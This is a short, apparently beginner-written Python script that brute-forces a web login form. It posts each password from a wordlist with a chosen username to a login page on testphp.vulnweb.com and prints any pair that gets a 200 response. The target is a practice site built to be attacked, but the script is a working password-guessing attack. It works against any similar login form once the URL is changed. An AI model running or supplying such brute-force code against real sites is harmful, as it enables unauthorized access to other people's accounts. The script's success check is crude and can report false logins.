from requests import post


def password_crack(wordlist, username):
    isLoggedIn = False
    url = "http://testphp.vulnweb.com/userinfo.php"
    # this is the url of the website we have to crack
    with open(wordlist) as thefile:
        # this opens the txt file that has all of our passwords inside of it
        for line in thefile:
            # this a for loop that goes through each line of the file
            password = line.rstrip()  # rstrip removes trailing newlines from an input (before this 'line' is "word\n")
            payload = {"uname": username, "pass": password}
            # This is the payload which delivers the username and password to the website
            request = post(url, data=payload, allow_redirects=False)
            # this is how our request works with there being a url, payload and make sure that we aren't redirected to
            # a different webpage
            if request.status_code == 200:
                # this checks if we successfully logged into the website or not
                print(username + " logged in with " + password)
                # it prints the username and password that was used to log into the website
                isLoggedIn = True
                exit()
        if not isLoggedIn:
            print("Couldn't log in with username and/or wordlist")
